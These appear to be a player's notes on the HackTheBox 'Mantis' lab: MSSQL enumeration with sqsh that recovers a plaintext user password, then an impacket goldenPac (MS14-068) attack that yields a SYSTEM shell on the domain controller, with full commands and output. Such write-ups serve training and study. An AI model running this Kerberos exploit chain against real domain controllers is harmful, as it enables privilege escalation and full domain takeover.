### Nmap 1433 
`ms-sql-ntlm-info`, Domain name and Computer name are required by the goldedPAC later on.
### DBbeaver failed on TLS1.0 MSSQL
##### show database
```bash
sqsh -S $IP -U 'admin' -P 'm$$ql_S@_P@ssW0rd!'
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> select name from sys.databases
2> go

name      

master
tempdb
model                                                                                                                                                                                     
msdb                                                                                                                                                                                      
orcharddb
```
##### show tables
```bash
1> select table_name from orcharddb.information_schema.tables;
2> go

table_name                                                                                                                                                                                

blog_Orchard_Blogs_RecentBlogPostsPartRecord                                                                                                                                              
blog_Orchard_Blogs_BlogArchivesPartRecord
<SNIP>...
```

Use `grep` to find those `user` related

##### show columns
```bash
1> select column_name from orcharddb.information_schema.columns where table_name='blog_Orchard_Users_UserPartRecord';
2> go

column_name 

Id
UserName
Email
NormalizedUserName
Password
```

##### Get creds
```bash
1> use orcharddb
2> go
1> select Password from blog_Orchard_Users_UserPartRecord
2> go

Password                                                                                                                                                                                  

AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==                                                                                                                      
J@m3s_P@ssW0rd!
```


### goldenPac MS14-068
The computer name is critical here to make it work

```bash
/usr/bin/impacket-goldenPac htb.local/James:'J@m3s_P@ssW0rd!'@10.129.98.3
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local seems not vulnerable (Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database))
❯ /usr/bin/impacket-goldenPac htb.local/James:'J@m3s_P@ssW0rd!'@mantis.htb.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file rXNyPJEv.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service umKg on mantis.htb.local.....
[*] Starting service umKg.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```
### Reference
* https://0xdf.gitlab.io/2020/09/03/htb-mantis.html#
* https://arz101.medium.com/hackthebox-mantis-33b955d65522
* https://medium.com/@0xAn0m4ly/mantis-hackthebox-detailed-writeup-75c1309cf08c
* https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html
* https://labs.withsecure.com/publications/digging-into-ms14-068-exploitation-and-defence
* https://github.com/A1vinSmith/OSCP-PWK/tree/master/PgPractice/Windows/Active%20Directory/Heist#quick-win-with-zerologon-nothing-httpsgithubcoma1vinsmithzerologon
* https://github.com/A1vinSmith/OSEP/tree/main/HTB/Windows/Fuse#method-2-zerologon